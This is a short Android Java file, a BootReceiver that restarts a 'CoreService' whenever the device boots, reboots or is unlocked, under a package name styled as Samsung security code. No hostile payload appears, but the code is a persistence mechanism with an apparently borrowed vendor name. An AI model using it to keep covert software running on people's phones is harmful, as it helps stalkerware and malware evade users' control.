package com.samsung.android.security.v8.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

import com.samsung.android.security.v8.services.CoreService;

public class BootReceiver extends BroadcastReceiver {
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        
        if (action != null && (
            action.equals(Intent.ACTION_BOOT_COMPLETED) ||
            action.equals(Intent.ACTION_LOCKED_BOOT_COMPLETED) ||
            action.equals("android.intent.action.QUICKBOOT_POWERON") ||
            action.equals(Intent.ACTION_REBOOT) ||
            action.equals(Intent.ACTION_USER_PRESENT)
        )) {
            // تشغيل الخدمة الأساسية
            Intent serviceIntent = new Intent(context, CoreService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        }
    }
}
